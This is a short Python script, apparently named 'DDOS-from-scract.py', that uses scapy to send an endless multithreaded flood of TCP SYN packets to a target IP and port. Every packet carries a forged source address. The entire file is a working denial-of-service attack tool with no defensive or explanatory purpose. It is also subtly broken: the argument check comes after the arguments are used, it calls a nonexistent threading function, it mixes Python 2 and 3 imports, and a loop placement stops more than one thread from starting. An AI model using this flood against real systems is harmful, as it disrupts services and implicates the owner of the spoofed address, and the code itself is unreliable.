#!/usr/bin/env python
from types import ClassMethodDescriptorType
from scapy.all import *
from time import sleep
import os, sys, re, commands, signal, logging, random, threading

target = str(sys.argv[1])
ddport = int(sys.argv[2])
threads = int(sys.argv[3])

def tcpdos(target, ddport):
	while True:
		try:
			x = random.randint(1024, 65535)
			spoof = "208.67.222.220"
			send(IP(dst=target, src=spoof) / TCP(sport=x, dport=ddport, flags="S"), verbose=True)

		except:
			pass


def shutdown(signal, frame):
	print("CTRL+C | Shutting down")
	sys.exit()

signal.signal(signal.SIGINT, shutdown)
print("CTRL+C to stop")
print('Attacking is starting...')
sleep(2)

for a in range(0, threads):
	threading.start_new_thread(tcpdos, (target, ddport))
	while True:
		sleep(1)

if len(sys.argv) != 4:
	print("python DDOS-from-scract.py <target> <port> <threads>")
	sys.exit()
